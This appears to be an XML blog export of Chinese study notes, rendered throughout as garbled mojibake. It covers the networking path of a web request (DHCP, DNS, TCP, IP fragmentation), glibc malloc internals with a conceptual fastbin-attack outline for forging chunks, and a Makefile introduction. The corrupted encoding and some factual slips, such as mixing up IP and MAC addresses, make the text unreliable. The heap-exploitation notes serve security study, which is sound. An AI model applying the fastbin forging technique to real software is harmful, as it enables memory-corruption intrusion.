Head,è®¾ç½®å‘å‡ºæ–¹çš„IPåœ°å€å’ŒæŽ¥æ”¶æ–¹çš„IPåœ°å€,è¿™æ—¶å¯¹äºŽè¿™ä¸¤è€…æœ¬æœºéƒ½ä¸çŸ¥é“,äºŽæ˜¯å‘å‡ºæ–¹çš„IPåœ°å€è®¾ä¸º0.0.0.0,æŽ¥æ”¶æ–¹IPåœ°å€è®¾ä¸º255.255.255.255 æœ€åŽçš„UDP Head,è®¾ç½®å‘å‡ºæ–¹çš„ç«¯å£å’ŒæŽ¥æ”¶æ–¹çš„ç«¯å£.DHCPåè®®è§„å®šå‘å‡ºæ–¹æ˜¯port 68,æŽ¥æ”¶æ–¹æ˜¯port 67. è¿™ä¸ªæ•°æ®åŒ…æž„é€ å®ŒæˆåŽï¼Œå°±å¯ä»¥å‘å‡ºäº†ã€‚ä»¥å¤ªç½‘æ˜¯å¹¿æ’­å‘é€ï¼ŒåŒä¸€ä¸ªå­ç½‘ç»œçš„æ¯å°è®¡ç®—æœºéƒ½æ”¶åˆ°äº†è¿™ä¸ªåŒ…ã€‚å› ä¸ºæŽ¥æ”¶æ–¹çš„MACåœ°å€æ˜¯FF-FF-FF-FF-FF-FFï¼Œçœ‹ä¸å‡ºæ˜¯å‘ç»™è°çš„ï¼Œæ‰€ä»¥æ¯å°æ”¶åˆ°è¿™ä¸ªåŒ…çš„è®¡ç®—æœºï¼Œè¿˜å¿…é¡»åˆ†æžè¿™ä¸ªåŒ…çš„IPåœ°å€ï¼Œæ‰èƒ½ç¡®å®šæ˜¯ä¸æ˜¯å‘ç»™è‡ªå·±çš„ã€‚å½“çœ‹åˆ°å‘å‡ºæ–¹IPåœ°å€æ˜¯0.0.0.0ï¼ŒæŽ¥æ”¶æ–¹æ˜¯255.255.255.255ï¼ŒäºŽæ˜¯DHCPæœåŠ¡å™¨çŸ¥é“â€è¿™ä¸ªåŒ…æ˜¯å‘ç»™æˆ‘çš„â€ï¼Œè€Œå…¶ä»–è®¡ç®—æœºå°±å¯ä»¥ä¸¢å¼ƒè¿™ä¸ªåŒ…ã€‚ æŽ¥ä¸‹æ¥ï¼ŒDHCPæœåŠ¡å™¨è¯»å‡ºè¿™ä¸ªåŒ…çš„æ•°æ®å†…å®¹ï¼Œåˆ†é…å¥½IPåœ°å€ï¼Œå‘é€å›žåŽ»ä¸€ä¸ªâ€DHCPå“åº”â€æ•°æ®åŒ…ã€‚è¿™ä¸ªå“åº”åŒ…çš„ç»“æž„ä¹Ÿæ˜¯ç±»ä¼¼çš„ï¼Œä»¥å¤ªç½‘æ ‡å¤´çš„MACåœ°å€æ˜¯åŒæ–¹çš„ç½‘å¡åœ°å€ï¼ŒIPæ ‡å¤´çš„IPåœ°å€æ˜¯DHCPæœåŠ¡å™¨çš„IPåœ°å€ï¼ˆå‘å‡ºæ–¹ï¼‰å’Œ255.255.255.255ï¼ˆæŽ¥æ”¶æ–¹ï¼‰ï¼ŒUDPæ ‡å¤´çš„ç«¯å£æ˜¯67ï¼ˆå‘å‡ºæ–¹ï¼‰å’Œ68ï¼ˆæŽ¥æ”¶æ–¹ï¼‰ï¼Œåˆ†é…ç»™è¯·æ±‚ç«¯çš„IPåœ°å€å’Œæœ¬ç½‘ç»œçš„å…·ä½“å‚æ•°åˆ™åŒ…å«åœ¨Dataéƒ¨åˆ†ã€‚æ–°åŠ å…¥çš„è®¡ç®—æœºæ”¶åˆ°è¿™ä¸ªå“åº”åŒ…ï¼ŒäºŽæ˜¯å°±çŸ¥é“äº†è‡ªå·±çš„IPåœ°å€ã€å­ç½‘æŽ©ç ã€ç½‘å…³åœ°å€ã€DNSæœåŠ¡å™¨ç­‰ç­‰å‚æ•°ã€‚ å®žä¾‹å‡è®¾ç½‘ç»œå‚æ•°å¦‚ä¸‹: æœ¬æœºIP:192.168.1.100,å­ç½‘æŽ©ç 255.255.255.0,ç½‘å…³IP:192.168.1.1,DNSçš„IPåœ°å€:8.8.8.8 ç„¶åŽæ‰“å¼€äº†Google Chrome,è¾“å…¥äº†www.google.com,æŽ¥ä¸‹æ¥æµè§ˆå™¨å°†è¦å‘Googleå‘é€ä¸€ä¸ªç½‘é¡µè¯·æ±‚æ•°æ®æŠ¥. DNSåè®®å‘é€æ•°æ®æŠ¥å°±è¦çŸ¥é“å¯¹æ–¹çš„IPåœ°å€,æˆ‘ä¹ˆå¯ä»¥é€šè¿‡DNSåè®®å°†ç½‘å€è½¬æ¢ä¸ºIPåœ°å€.å·²çŸ¥DNSæœåŠ¡å™¨ä¸º8.8.8.8,äºŽæ˜¯å‘å…¶å‘é€DNSæ•°æ®æŠ¥(port 53): ä¹‹åŽDNSæœåŠ¡å™¨åšå‡ºå“åº”,å‘Šè¯‰æˆ‘ä»¬GoogleæœåŠ¡å™¨çš„IPåœ°å€172.194.72.105. å­ç½‘æŽ©ç å¾—åˆ°IPåœ°å€åŽè¦é€šè¿‡å­ç½‘æŽ©ç æ¥åˆ¤æ–­æ”¹IPæ˜¯å¦åœ¨åŒä¸€ä¸ªå­ç½‘,ä»¥ç¡®å®šè¦ä¸è¦å‘ç½‘å…³å‘åŒ….å°†å­ç½‘æŽ©ç ä¸Žè‡ªå·±çš„IPåœ°å€å’ŒGoogleçš„IPåœ°å€è¿›è¡ŒANDè¿ç®—,å‘çŽ°ç»“æžœä¸ç›¸ç­‰,æ‰€ä»¥ä¸åœ¨ä¸€ä¸ªå­ç½‘.æ‰€ä»¥æˆ‘ä»¬è¦å‘Googleå‘é€æ•°æ®æŠ¥,å¿…é¡»é€šè¿‡ç½‘å…³192.168.1.1è½¬å‘,ä¹Ÿå°±æ˜¯è¯´æŽ¥æ”¶æ–¹çš„IPåœ°å€å°†æ˜¯ç½‘å…³çš„MACåœ°å€. åº”ç”¨å±‚åè®®æµè§ˆç½‘é¡µç”¨åˆ°çš„æ˜¯HTTPåè®®,å®ƒçš„æ•°æ®æŠ¥é•¿ä¸‹é¢è¿™ä¸ªæ ·å­: GET / HTTP/1.1Host: www.google.comConnection: keep-aliveUser-Agent: Mozilla/5.0 (Windows NT 6.1) â€¦â€¦Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8Accept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3Cookie: â€¦ â€¦ è¢«åµŒåœ¨TCPæ•°æ®æŠ¥ä¹‹ä¸­,å‡å®šä¸º4960å­—èŠ‚. TCPåè®®TCPæ•°æ®æŠ¥éœ€è¦è®¾ç½®ç«¯å£,æŽ¥æ”¶æ–¹çš„HTTPé»˜è®¤ç«¯å£æ˜¯80,è€Œå‘é€æ–¹çš„ç«¯å£æ˜¯1024-65535ä¹‹é—´éšæœºç¡®å®šçš„. å‡å®šä¸º51775.TCPæ•°æ®æŠ¥çš„Headé•¿ä¸º20å­—èŠ‚,åŠ ä¸ŠåµŒå…¥HTTPçš„æ•°æ®æŠ¥,æ€»é•¿åº¦å˜ä¸º4980å­—èŠ‚. IPåè®®ç„¶åŽTCPæ•°æ®æŠ¥å†åµŒå…¥IPæ•°æ®æŠ¥,IPæ•°æ®æŠ¥éœ€è¦è®¾ç½®åŒæ–¹çš„IPåœ°å€,è¿™æ˜¯å·²çŸ¥çš„.å‘é€æ–¹æ˜¯192.168.1.100ï¼ˆæœ¬æœºï¼‰ï¼ŒæŽ¥æ”¶æ–¹æ˜¯172.194.72.105ï¼ˆGoogleï¼‰ã€‚IPæ•°æ®åŒ…çš„æ ‡å¤´é•¿åº¦ä¸º20å­—èŠ‚ï¼ŒåŠ ä¸ŠåµŒå…¥çš„TCPæ•°æ®åŒ…ï¼Œæ€»é•¿åº¦å˜ä¸º5000å­—èŠ‚ã€‚ Ethernetåè®®æœ€åŽIPæ•°æ®æŠ¥åµŒå…¥ä»¥å¤ªç½‘æ•°æ®æŠ¥,ä»¥å¤ªç½‘æ•°æ®æŠ¥è®¾ç½®åŒæ–¹çš„MACåœ°å€,å‘é€æ–¹ä¸ºæœ¬æœºçš„ç½‘å¡MACåœ°å€ï¼ŒæŽ¥æ”¶æ–¹ä¸ºç½‘å…³192.168.1.1çš„MACåœ°å€ï¼ˆé€šè¿‡ARPåè®®å¾—åˆ°ï¼‰ã€‚ ä»¥å¤ªç½‘æ•°æ®åŒ…çš„æ•°æ®éƒ¨åˆ†ï¼Œæœ€å¤§é•¿åº¦ä¸º1500å­—èŠ‚ï¼Œè€ŒçŽ°åœ¨çš„IPæ•°æ®åŒ…é•¿åº¦ä¸º5000å­—èŠ‚ã€‚å› æ­¤ï¼ŒIPæ•°æ®åŒ…å¿…é¡»åˆ†å‰²æˆå››ä¸ªåŒ…ã€‚å› ä¸ºæ¯ä¸ªåŒ…éƒ½æœ‰è‡ªå·±çš„IPæ ‡å¤´ï¼ˆ20å­—èŠ‚ï¼‰ï¼Œæ‰€ä»¥å››ä¸ªåŒ…çš„IPæ•°æ®åŒ…çš„é•¿åº¦åˆ†åˆ«ä¸º1500ã€1500ã€1500ã€560ã€‚ æœåŠ¡å™¨ç«¯å“åº”ç»è¿‡å¤šä¸ªç½‘å…³è½¬å‘,GoogleæœåŠ¡å™¨æ”¶åˆ°äº†è¿™å››ä¸ªä»¥å¤ªç½‘æ•°æ®æŠ¥.æ ¹æ®IP Headçš„åºå·,Googleå°†å››ä¸ªåŒ…æ‹¼æŽ¥èµ·æ¥,å–å‡ºå®Œæ•´çš„TCPæ•°æ®,æ ¹æ®å…¶ä¸­çš„HTTPè¯·æ±‚ä½œå‡ºHTTPå“åº”,å†ç”¨TCPåè®®å‘å›ž.æœ¬æœºæ”¶åˆ°HTTPå“åº”åŽ,å°±å¯ä»¥å°†ç½‘é¡µæ˜¾ç¤ºå‡ºæ¥,å®Œæˆä¸€æ¬¡ç½‘ç»œé€šä¿¡.]]></content>
      <tags>
        <tag>è®¡ç®—æœºç½‘ç»œ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[é•¿äº­å…¬å¼€è¯¾ä¹‹å †æº¢å‡º]]></title>
    <url>%2F2020%2F05%2F04%2F%E9%95%BF%E4%BA%AD%E5%85%AC%E5%BC%80%E8%AF%BE%E4%B9%8B%E5%A0%86%E6%BA%A2%E5%87%BA%2F</url>
    <content type="text"><![CDATA[ä»€ä¹ˆæ˜¯å †æ ˆé€šå¸¸ç”¨äºŽä¸ºå‡½æ•°åˆ†é…å›ºå®šå¤§å°çš„å±€éƒ¨å†…å­˜ï¼Œè€Œå †æ˜¯å¯ä»¥æ ¹æ®è¿è¡Œæ—¶çš„éœ€è¦è¿›è¡ŒåŠ¨æ€åˆ†é…ä¸Žé‡Šæ”¾çš„å†…å­˜ï¼Œå¤§å°å¯å˜ã€‚Malloc/New-Free/Deleteï¼Œä¸¤ç»„æŽ¥å£ï¼Œåˆ†åˆ«æ˜¯ç”³è¯·å†…å­˜çš„ä¸¤ç§æ–¹å¼ï¼ŒCä¸ŽC++ã€‚ å †çš„å®žçŽ°é‡ç‚¹å…³æ³¨å†…å­˜å—çš„ç»„ç»‡å’Œç®¡ç†æ–¹å¼ï¼Œå°¤å…¶æ˜¯ç©ºé—²å†…å­˜å—ã€‚é‡ç‚¹åœ¨äºŽå¦‚ä½•æé«˜åˆ†é…å’Œé‡Šæ”¾æ•ˆçŽ‡/å¦‚ä½•é™ä½Žç¢Žç‰‡åŒ–ï¼Œæé«˜ç©ºé—´åˆ©ç”¨çŽ‡ã€‚ å¸¸è§å †å®žçŽ° dlmalloc-é€šç”¨åˆ†é…å™¨ ptmalloc2-glibcï¼ŒåŸºäºŽdlmalloc forkå‡ºæ¥ï¼Œæ”¯æŒå¤šçº¿ç¨‹ã€‚ jemalloc-FreeBSDï¼ŒFirefoxï¼ŒAndroid tcmalloc-Google Chrome libumen-Solaris segment heap-Win10 ptmalloc2çš„å¤šçº¿ç¨‹æ”¯æŒï¼šä¸åŒçš„çº¿ç¨‹ç»´æŠ¤ä¸åŒçš„å †ï¼Œç§°ä¸ºper thread arena ä¸»çº¿ç¨‹åˆ›å»ºçš„å †ï¼Œç§°ä¸ºmain arena arenaæ•°é‡å—åˆ°CPUæ ¸æ•°é™åˆ¶ï¼š32ä½ç³»ç»Ÿçš„arenaæ•°é‡ä¸Šé™=2xæ ¸æ•°ï¼Œ64ä½ç³»ç»Ÿarenaæ•°é‡ä¸Šé™=8xæ ¸æ•°ã€‚ glibcçš„å †ç®¡ç†å®žçŽ°arenaè¯¥ç»“æž„ä½“æŒ‡çš„æ˜¯å †å†…å­˜åŒºåŸŸæœ¬èº«è€Œå¹¶éžç»“æž„ï¼Œä¸»çº¿ç¨‹çš„main arenaé€šè¿‡sbrkåˆ›å»ºï¼Œå…¶ä»–çº¿ç¨‹arenaé€šè¿‡mmapåˆ›å»ºã€‚ malloc_stateè¯¥ç»“æž„ä½“ç®¡ç†arenaçš„æ ¸å¿ƒç»“æž„ï¼ŒåŒ…å«å †çš„çŠ¶æ€ä¿¡æ¯ï¼Œbinsé“¾è¡¨ç­‰ã€‚main arenaå¯¹åº”çš„mallloc_stateç»“æž„å­˜å‚¨åœ¨glibcçš„å…¨å±€å˜é‡ä¸­ã€‚å…¶ä»–çº¿ç¨‹arenaå¯¹åº”çš„malloc_stateå­˜å‚¨åœ¨arenaæœ¬èº«ä¸­ã€‚ binsbinsç”¨æ¥ç®¡ç†ç©ºé—²å†…å­˜å—ï¼Œé€šå¸¸ä½¿ç”¨é“¾è¡¨ç»“æž„æ¥è¿›è¡Œç»„ç»‡ã€‚ chunkså†…å­˜å—çš„ç»“æž„ *glibc2.26ä»¥ä¸‹ï¼ˆä¸åŒ…å«2.26ï¼‰ï¼Œå³å‡ºçŽ°tcacheä¹‹å‰çš„ç®¡ç†æ–¹å¼ã€‚64bit OSã€‚* arenaçš„å¤´éƒ¨ç»“æž„ï¼šmalloc_state1234567891011121314struct malloc_state &#123;mutex_t mutex; /* åŒæ­¥è®¿é—®ç›¸å…³ï¼Œäº’æ–¥é” */int flags; /* æ ‡å¿—ä½ï¼Œä»¥å‰æ˜¯max_fastï¼Œåœ¨ä¸€äº›è€çš„æ–‡ç« ä¸Šå¯èƒ½è¿˜ä½¿ç”¨çš„è¿™ä¸ªè¯´æ³•ï¼Œæ¯”å¦‚phrack */mfastbinptr fastbins[NFASTBINS]; /* fastbinsï¼Œä¹‹åŽä¼šè¯´åˆ°,æ˜¯ä¸€ä¸ªchunkçš„é“¾è¡¨ */mchunkptr top; /* top chunkï¼Œä¸€ä¸ªç‰¹æ®Šçš„chunkï¼Œåœ¨ä¹‹åŽä¼šè¯´åˆ° */mchunkptr last_remainder; /* æœ€åŽä¸€æ¬¡æ‹†åˆ†top chunkå¾—åˆ°çš„å‰©ä½™å†…å®¹ï¼Œä¹‹åŽä¼šè¯´åˆ° */mchunkptr bins[BINS * 2]; /* binsï¼Œä¸€ä¸ªchunkçš„é“¾è¡¨çš„æ•°ç»„ï¼Œä¹‹åŽä¼šè¯´åˆ° */unsigned int binmap[BINMAPSIZE]; /* binsæ˜¯å¦ä¸ºç©ºçš„ä¸€ä¸ªä½å›¾ */struct malloc_state *next; /* é“¾è¡¨ï¼Œä¸‹ä¸€ä¸ªmalloc_stateçš„ä½ç½® */INTERNAL_SIZE_T system_mem;INTERNAL_SIZE_T max_system_mem;&#125;static struct malloc_state main_arena;/*global variable in libc.so*/ malloc_stateå­˜å‚¨arenaçš„çŠ¶æ€ã€‚ ä¸»çº¿ç¨‹çš„malloc_srateç»“æž„å­˜å‚¨åœ¨glibcçš„å…¨å±€å˜é‡ä¸­ï¼Œå˜é‡åä¸ºmain_arenaï¼Œæ¦‚è§ˆå¦‚ä¸‹ã€‚ ![QQå›¾ç‰‡20200504182415](D:\My Daily\P\QQå›¾ç‰‡20200504182415.png) Top Chunkæ„ä¸ºè‡ªç•™åœ°ï¼Œå¯ä»¥é€šè¿‡sbrkæ‰©å±•ã€‚ ![QQå›¾ç‰‡20200504193145](D:\My Daily\P\QQå›¾ç‰‡20200504193145.png) ![QQå›¾ç‰‡20200504194746](D:\My Daily\P\QQå›¾ç‰‡20200504194746.png) åŒºåˆ«åœ¨äºŽæœ€åŽä¸€ä¸ªéƒ¨åˆ†prev_sizeæ˜¯å¦è¢«æ•°æ®æ‰€å¡«å……ã€‚ï¼ˆfdå’Œbkä¹Ÿæ˜¯å§ï¼‰ã€‚ mallocå‚æ•°ä¸ºç”¨æˆ·ç”³è¯·çš„å†…å­˜å¤§å°ã€‚ chunkåŒ…å«æ•°æ®å’Œmetadataã€‚ è¿”å›žçš„chunkåªè¦ä¿è¯å…¶ä¸­çš„å¯ç”¨æ•°æ®å¤§å°å¤§äºŽç­‰äºŽç”¨æˆ·ç”³è¯·å³å¯ã€‚ åœ¨x86 32ä½å¹³å°ä¸‹ï¼Œchunkçš„å¤§å°ä¸€å®šæ˜¯8å­—èŠ‚çš„æ•´æ•°å€ï¼Œx64å¹³å°ä¸‹ï¼Œchunkçš„å¤§å°ä¸€å®šæ˜¯16å­—èŠ‚çš„æ•´æ•°å€ã€‚ Binsç»“æž„ç”¨æ¥ç®¡ç†å’Œç»„ç»‡ç©ºé—²å†…å­˜å—çš„é“¾è¡¨ç»“æž„ï¼Œæ ¹æ®å¤§å°çŠ¶æ€åˆ†ä¸ºè®¸å¤šã€‚ Fast binsï¼Œå°çš„chunkã€‚ small binsï¼Œä¸­ç­‰å¤§å°çš„chunk large binsï¼Œè¾ƒå¤§çš„chunk unsorted binsï¼Œå­˜æ”¾æœªæ•´ç†chunkã€‚ å»ºè®®çœ‹glibcæºç  fastbin attack Fast binsï¼šè¿˜æ˜¯è‡ªå·±å†™ç¨‹åºå¯¹ç…§æºç çœ‹ã€‚ å¤§å°ï¼Œ32ä½æ˜¯16-64å­—èŠ‚ï¼Œ64ä½æ˜¯32-128å­—èŠ‚ã€‚ ç›¸åŒå¤§å°çš„chunkæ”¾åœ¨ä¸€ä¸ªbinä¸­ã€‚ å•å‘é“¾è¡¨ï¼ŒfdæŒ‡å‘ä¸Šä¸€ä¸ªfree chunkã€‚ åŽè¿›å…ˆå‡º First in last outã€‚å…ˆé‡Šæ”¾çš„chunkåè€Œå…ˆè¢«ç”³è¯·ï¼ˆåŒç­‰å¤§å°ï¼ŒåŽé‡Šæ”¾ï¼Œå…ˆåˆ©ç”¨ï¼‰ã€‚ ç›¸é‚»çš„ç©ºé—²fast bin chunkä¸ä¼šè¢«åžå¹¶ï¼ˆPæ ‡å¿—ä¸æ”¹å˜ï¼‰ã€‚ å½“chunkè¢«freeæ—¶ï¼Œä¸ä¼šæ¸…ç†PREV_INUSEæ ‡å¿—ï¼ˆè¿˜ä¿ç•™åŽŸæ¥çš„æ•°æ®ï¼‰ã€‚ å†…å­˜ä¸­ä¸¤ä½ä¸€ä¸ªå­—èŠ‚ã€‚0X41414141ï¼Œä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªASCIIç ã€‚NMPæ€Žä¹ˆè¡¨ç¤ºã€‚ small bins![QQå›¾ç‰‡20200504203436](D:\My Daily\P\QQå›¾ç‰‡20200504203436.png) bins[2]bins[3]ä¸€å®šæ˜¯æœ€å°çš„chunkçš„åŒå‘é“¾è¡¨ï¼Œbins[0]å’Œbins[1]å‘¢ï¼Ÿ large bins![QQå›¾ç‰‡20200504204347](D:\My Daily\P\QQå›¾ç‰‡20200504204347.png) æ¯ç»„binsä¸­çš„chunkå¤§å°ä¸ä¸€å®šç›¸åŒï¼ŒæŒ‰ç”±å¤§åˆ°å°çš„é¡ºåºåœ¨é“¾è¡¨ä¸­æŽ’åˆ—ã€‚ unsorted binsï¼ˆæ”¾å…¥å¯¹åº”çš„xxxxæœ‰è¯¯ï¼‰![QQå›¾ç‰‡20200504211557](D:\My Daily\P\QQå›¾ç‰‡20200504211557.png) åŒºåˆ«ï¼šæ²¡çœ‹æ‡‚ ![QQå›¾ç‰‡20200504212512](D:\My Daily\P\QQå›¾ç‰‡20200504212512.png) ![QQå›¾ç‰‡20200504212654](D:\My Daily\P\QQå›¾ç‰‡20200504212654.png) mallocå’Œfreeçš„å·¥ä½œæµç¨‹malloc()å·¥ä½œæµç¨‹ å¦‚æžœsize&lt;max_sizeï¼Œåœ¨fast binsä¸­å¯»æ‰¾å‘å°„å° chunkï¼Œæ‰¾åˆ°åˆ™ç»“æŸã€‚ å¦‚æžœsize in_smallbin_rangeï¼Œåœ¨small binsä¸­å¯»æ‰¾small chunkã€‚ å¦‚æžœsize not in_smallbin_range,åˆå¹¶æ‰€æœ‰fastbinçš„chunk å¾ªçŽ¯aï¼šæ£€æŸ¥unsorted binä¸­çš„last_ramainder,æ»¡è¶³ä¸€å®šæ¡ä»¶åˆ†è£‚ä¹‹ï¼Œå‰©ä½™çš„chunkæ ‡è®°ä¸ºæ–°çš„last_remainderã€‚ å¾ªçŽ¯bï¼šåœ¨unsorted binä¸­æœç´¢ï¼ŒåŒæ—¶è¿›è¡Œæ•´ç†ã€‚å¦‚æžœé‡åˆ°ç²¾ç¡®å¤§å°åˆ™è¿”å›žï¼Œå¦åˆ™æŠŠå½“å‰chunkæ•´ç†åˆ°small/large binsä¸­åŽ»ã€‚ å¾ªçŽ¯cï¼šåœ¨small binå’Œlarge binä¸­æœç´¢æœ€åˆé€‚çš„chunkï¼ˆä¸ä¸€å®šæ˜¯ç²¾ç¡®å¤§å°ï¼‰ ä½¿ç”¨top chunkã€‚ free()çš„å·¥ä½œæµç¨‹ å¦‚æžœsize &lt; max fast,æ”¾å…¥fast binï¼Œç»“æŸ å¦‚æžœå‰ä¸€ä¸ªchunkæ˜¯freeçš„ï¼Œunlinkå‰é¢çš„chunkï¼Œå¹¶åˆå¹¶ä¸¤ä¸ªchunkæ”¾å…¥unsorted binã€‚ å¦‚æžœåŽä¸€ä¸ªchunkæ˜¯top chunkï¼Œåˆ™å°†å½“å‰chunkå¹¶å…¥top chunkã€‚ å¦‚æžœåŽä¸€ä¸ªchunkæ˜¯freeçš„ï¼ŒunlinkåŽé¢çš„chunkï¼Œåˆå¹¶ä¸¤ä¸ªchunkå¹¶æ”¾å…¥unsorted binã€‚ å‰åŽéƒ½ä¸æ˜¯freeçš„ï¼Œæ”¾å…¥unsorted bin. Fast binåˆ©ç”¨æŠ€æœ¯Fast binä¸ºå•å‘é“¾è¡¨ï¼Œç»“æž„ç®€å•ï¼Œå®¹æ˜“ä¼ªé€ ã€‚å¹¶ä¸”ä¸ºäº†æé«˜æ•ˆçŽ‡ï¼Œå®‰å…¨æ£€æŸ¥è¾ƒå°‘ã€‚ä½†æ˜¯åªé’ˆå¯¹fast binå¤§å°çš„chunkï¼Œå¯¹small/large chunkä¸é€‚ç”¨ã€‚ åˆ©ç”¨æ€è·¯ï¼š ç©ºé—²Fast chunkå¦‚æžœå‘ç”Ÿæº¢å‡ºè€Œè¢«è¦†ç›–ï¼Œåˆ™é“¾è¡¨æŒ‡é’ˆfdå¯ä»¥è¢«ä¿®æ”¹ã€‚ å¯ä»¥é€šè¿‡ä¿®æ”¹é“¾è¡¨æŒ‡é’ˆfdï¼Œåœ¨Fast biné“¾è¡¨ä¸­å¼•å…¥ä¼ªé€ çš„ç©ºé—²Fast chunkã€‚ ä¸‹æ¬¡åˆ†é…æ—¶åˆ†é…å‡ºä¼ªé€ çš„Fast chunkã€‚ ä¼ªé€ çš„Fast chunkå¯ä»¥åœ¨.bsså…¨å±€å˜é‡å¤„ï¼Œä¹Ÿå¯ä»¥åœ¨æ ˆä¸Šã€‚ åœ¨æ ˆä¸Šä¼ªé€ Fast chunkï¼šè¦†ç›–è¿”å›žåœ°å€ã€‚ åœ¨bssä¸Šä¼ªé€ Fast chunkï¼Œä¿®æ”¹å…¨å±€å˜é‡ã€‚ åœ¨å †ä¸Šä¼ªé€ Fast chunkï¼Œä¿®æ”¹å †ä¸Šçš„æ•°æ®ã€‚ æ–°ç‰ˆæœ¬ä¸­glibcä¸­çš„tcacheå †çš„èŠ±å¼çŽ©æ³•æŒ‡é’ˆä¸Žåœ°å€ç”¨æˆ·åœ¨è°ƒç”¨mallocå‡½æ•°æ—¶è¿”å›žçš„å€¼ä¸ºä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘åˆ†é…åˆ°çš„å †ç©ºé—´ï¼ˆç”¨æˆ·æ•°æ®åŒºï¼‰ é“¾è¡¨åœ¨pwnçš„å †é¢˜ä¸­ï¼Œç»å¸¸ä¼šæœ‰ä¸€äº›â€ç¬”è®°ç®¡ç†ç³»ç»Ÿâ€çš„é¢˜ç›®ï¼Œç¬”è®°çš„æ•°æ®ç»“æž„å°±æ˜¯ä½¿ç”¨é“¾è¡¨è¿žæŽ¥èµ·æ¥çš„]]></content>
  </entry>
  <entry>
    <title><![CDATA[makefileå…¥é—¨]]></title>
    <url>%2F2020%2F05%2F01%2Fmakefile%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[Makefile æ–‡ä»¶æè¿°äº† Linux ç³»ç»Ÿä¸‹ C/C++ å·¥ç¨‹çš„ç¼–è¯‘è§„åˆ™ï¼Œå®ƒç”¨æ¥è‡ªåŠ¨åŒ–ç¼–è¯‘ C/C++ é¡¹ç›®ã€‚ä¸€æ—¦å†™ç¼–å†™å¥½ Makefile æ–‡ä»¶ï¼Œåªéœ€è¦ä¸€ä¸ª make å‘½ä»¤ï¼Œæ•´ä¸ªå·¥ç¨‹å°±å¼€å§‹è‡ªåŠ¨ç¼–è¯‘ï¼Œä¸å†éœ€è¦æ‰‹åŠ¨æ‰§è¡Œ GCC å‘½ä»¤ã€‚ ä¸€ä¸ªä¸­å¤§åž‹ C/C++ å·¥ç¨‹çš„æºæ–‡ä»¶æœ‰æˆç™¾ä¸Šåƒä¸ªï¼Œå®ƒä»¬æŒ‰ç…§åŠŸèƒ½ã€æ¨¡å—ã€ç±»åž‹åˆ†åˆ«æ”¾åœ¨ä¸åŒçš„ç›®å½•ä¸­ï¼ŒMakefile æ–‡ä»¶å®šä¹‰äº†ä¸€ç³»åˆ—è§„åˆ™ï¼ŒæŒ‡æ˜Žäº†æºæ–‡ä»¶çš„ç¼–è¯‘é¡ºåºã€ä¾èµ–å…³ç³»ã€æ˜¯å¦éœ€è¦é‡æ–°ç¼–è¯‘ç­‰ã€‚ Windows ä¸‹çš„é›†æˆå¼€å‘çŽ¯å¢ƒï¼ˆIDEï¼‰å·²ç»å†…ç½®äº† Makefileï¼Œæˆ–è€…è¯´ä¼šè‡ªåŠ¨ç”Ÿæˆ Makefileï¼Œæˆ‘ä»¬ä¸ç”¨åŽ»æ‰‹åŠ¨ç¼–å†™ã€‚Linux ä¸­å´ä¸èƒ½è¿™æ ·ï¼Œéœ€è¦æˆ‘ä»¬åŽ»æ‰‹åŠ¨çš„å®Œæˆè¿™é¡¹å·¥ä½œã€‚Linux ä¸‹å¯ä»¥å­¦ä¹ çš„å¼€å‘è¯­è¨€æœ‰å¾ˆå¤šï¼Œå¸¸è§çš„æœ‰ C/C++è¯­è¨€ã€pythonã€java ç­‰ç­‰ã€‚å¦‚æžœä½ æƒ³è¦åœ¨ Linux(Unix) ä¸‹åšå¼€å‘çš„è¯ï¼Œä¸äº†è§£ Makefile æ˜¯ä¸€ä»¶éžå¸¸å¤±è´¥çš„äº‹æƒ…ï¼Œç”šè‡³è¯´ä½ å°±æˆä¸ºä¸äº†ä¸€ä¸ªåˆæ ¼çš„ Linux å¼€å‘å·¥ç¨‹å¸ˆã€‚ä¸æ‡‚ Makefileï¼Œå°±æ“ä½œä¸äº†å¤šæ–‡ä»¶ç¼–ç¨‹ï¼Œå°±å®Œæˆä¸äº†ç›¸å¯¹äºŽå¤§çš„å·¥ç¨‹é¡¹ç›®çš„æ“ä½œã€‚ ä¼˜ç‚¹Makefile ä¼šå½»åº•ç®€åŒ–ç¼–è¯‘çš„æ“ä½œã€‚æŠŠè¦é“¾æŽ¥çš„åº“æ–‡ä»¶æ”¾åœ¨ Makefile ä¸­ï¼Œåˆ¶å®šç›¸åº”çš„è§„åˆ™å’Œå¯¹åº”çš„é“¾æŽ¥é¡ºåºã€‚è¿™æ ·åªéœ€è¦æ‰§è¡Œ make å‘½ä»¤ï¼Œå·¥ç¨‹å°±ä¼šè‡ªåŠ¨ç¼–è¯‘ã€‚æ¯æ¬¡æƒ³è¦ç¼–è¯‘å·¥ç¨‹çš„æ—¶å€™å°±æ‰§è¡Œ make ï¼Œçœç•¥æŽ‰æ‰‹åŠ¨ç¼–è¯‘ä¸­çš„å‚æ•°é€‰é¡¹å’Œå‘½ä»¤ï¼Œéžå¸¸çš„æ–¹ä¾¿ã€‚ Makefile æ”¯æŒå¤šçº¿ç¨‹å¹¶å‘æ“ä½œï¼Œä¼šæžå¤§çš„ç¼©çŸ­æˆ‘ä»¬çš„ç¼–è¯‘æ—¶é—´ï¼Œå¹¶ä¸”å½“æˆ‘ä»¬ä¿®æ”¹äº†æºæ–‡ä»¶ä¹‹åŽï¼Œç¼–è¯‘æ•´ä¸ªå·¥ç¨‹çš„æ—¶å€™ï¼Œmake å‘½ä»¤åªä¼šç¼–è¯‘æˆ‘ä»¬ä¿®æ”¹è¿‡çš„æ–‡ä»¶ï¼Œæ²¡æœ‰ä¿®æ”¹çš„æ–‡ä»¶ä¸ç”¨é‡æ–°ç¼–è¯‘ï¼Œä¹Ÿæžå¤§çš„è§£å†³äº†æˆ‘ä»¬è€—è´¹æ—¶é—´çš„é—®é¢˜ã€‚ 